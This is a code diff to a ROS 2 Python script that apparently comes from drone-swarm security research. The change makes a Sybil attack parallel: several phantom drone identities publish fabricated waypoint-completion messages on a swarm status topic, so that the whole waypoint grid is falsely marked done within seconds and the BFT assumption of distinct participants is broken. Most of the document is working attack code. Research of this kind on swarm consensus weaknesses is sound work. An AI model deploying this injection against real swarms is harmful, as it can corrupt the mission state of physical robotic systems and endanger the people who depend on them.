@@ -2,19 +2,24 @@
 """
 sybil_attacker_lite.py
 ======================
-Sybil / BFT-threshold attack for the T-ITS extension. Injects
-f+1 phantom drone identities (drone{N+1}, drone{N+2}, ...,
-drone{N+f+1}) and reports false waypoint completions under each.
+Sybil / BFT-threshold attack for the T-ITS extension. Injects f+1
+phantom drone identities in parallel, each publishing its own slice
+of the waypoint grid simultaneously. This faithfully models the
+threat: any network-adjacent attacker can spawn arbitrarily many
+DDS participants, each indistinguishable from a legitimate drone,
+and have them all publish in parallel.
 
-The headline experiment for the extension: at N=10 with f=3 honest
-Byzantine tolerance threshold (N >= 3f + 1 implies f_max = 3), inject
-4 phantoms to empirically breach the BFT bound.
+Implementation: a single rclpy node with N independent per-phantom
+schedules driven by a fast (50ms) tick. Each schedule advances its
+own waypoint index at the configured spoof_delay rate, independent
+of the others. Total injection time is therefore one phantom's
+share of the grid, not the sum.
 
-Each phantom claims a contiguous slice of the waypoint grid; together
-they cover the whole map. The point is not maximum coverage gap, but
-demonstrating that fabricated identities are accepted without
-challenge -- the assumption that any BFT-style consensus rests on
-(distinct, authenticated participants) is violated.
+For the headline experiment at N_real=10 with f=3 (so f+1=4 phantoms),
+each phantom injects ~22 waypoints at 0.5s spoof_delay, completing
+in ~11 seconds. The full 90-waypoint grid is poisoned by t=14 from
+launch (3s discovery + 11s parallel injection), well before mission
+completion at t~35s.
 
 Usage
 -----
@@ -32,7 +37,7 @@ from rclpy.node import Node
 from std_msgs.msg import String
 
 
-class SybilAttacker(Node):
+class ParallelSybilAttacker(Node):
     def __init__(self, num_real, num_phantoms, total_wp,
                  discovery_time, spoof_delay):
         super().__init__('sybil_attacker_lite')
@@ -45,45 +50,62 @@ class SybilAttacker(Node):
         self.pub = self.create_publisher(
             String, '/swarm/waypoint_status', 10)
 
-        self.phantom_ids = [f'drone{num_real + 1 + i}'
-                            for i in range(num_phantoms)]
-
-        self.get_logger().info(
-            f'Sybil attacker armed: N_real={num_real}, '
-            f'phantoms={self.phantom_ids}, total_wp={total_wp}, '
-            f'discovery={discovery_time}s, delay={spoof_delay}s')
-
-    def build_plan(self):
-        """Distribute waypoints evenly across phantoms."""
-        plan = []
-        per_phantom = self.total_wp // self.num_phantoms
-        for i, pid in enumerate(self.phantom_ids):
+        # Build a per-phantom schedule: waypoint slice + injection
+        # cursor + last-inject timestamp. The first injection happens
+        # discovery_time seconds after start, then every spoof_delay
+        # seconds thereafter, independently per phantom.
+        per_phantom = total_wp // num_phantoms
+        self.phantom_schedules = []
+        for i in range(num_phantoms):
+            phantom_id = f'drone{num_real + 1 + i}'
             start = i * per_phantom
-            end = (start + per_phantom
-                   if i < self.num_phantoms - 1
-                   else self.total_wp)
-            for wp in range(start, end):
-                plan.append((pid, wp))
-        return plan
+            end = ((i + 1) * per_phantom
+                   if i < num_phantoms - 1 else total_wp)
+            self.phantom_schedules.append({
+                'id': phantom_id,
+                'wps': list(range(start, end)),
+                'index': 0,
+                'last_inject': 0.0,
+                'started': False,
+            })
 
-    def run(self):
-        self.get_logger().info(f'Discovering for {self.discovery_time}s...')
-        time.sleep(self.discovery_time)
+        self.start_time = time.time()
+        self.tick_period = 0.05
+        self.create_timer(self.tick_period, self.tick)
 
-        plan = self.build_plan()
         self.get_logger().info(
-            f'Phantom plan: {len(plan)} reports across '
-            f'{self.num_phantoms} fabricated identities')
+            f'Parallel Sybil armed: N_real={num_real}, '
+            f'phantoms={num_phantoms}, total_wp={total_wp}, '
+            f'discovery={discovery_time}s, delay={spoof_delay}s. '
+            f'Each phantom owns ~{per_phantom} WPs '
+            f'(~{per_phantom * spoof_delay:.1f}s of injection).')
 
-        for drone_id, wp in plan:
-            payload = json.dumps({'drone_id': drone_id,
+    def tick(self):
+        now = time.time()
+        elapsed = now - self.start_time
+
+        # Hold injection until discovery window ends.
+        if elapsed < self.discovery_time:
+            return
+
+        # Each phantom advances independently. They share the tick
+        # but not the cursor — this is what makes them parallel.
+        for sched in self.phantom_schedules:
+            if sched['index'] >= len(sched['wps']):
+                continue
+            if not sched['started']:
+                sched['started'] = True
+                sched['last_inject'] = now - self.spoof_delay
+            if now - sched['last_inject'] < self.spoof_delay:
+                continue
+            wp = sched['wps'][sched['index']]
+            payload = json.dumps({'drone_id': sched['id'],
                                   'waypoint_id': wp})
             msg = String()
             msg.data = payload
             self.pub.publish(msg)
-            time.sleep(self.spoof_delay)
-
-        self.get_logger().info('Sybil injection complete.')
+            sched['index'] += 1
+            sched['last_inject'] = now
 
 
 def main():
@@ -98,10 +120,11 @@ def main():
     args = p.parse_args()
 
     rclpy.init()
-    a = SybilAttacker(args.num_real, args.num_phantoms, args.total_wp,
-                      args.discovery_time, args.spoof_delay)
+    a = ParallelSybilAttacker(args.num_real, args.num_phantoms,
+                              args.total_wp, args.discovery_time,
+                              args.spoof_delay)
     try:
-        a.run()
+        rclpy.spin(a)
     except KeyboardInterrupt:
         pass
     finally:
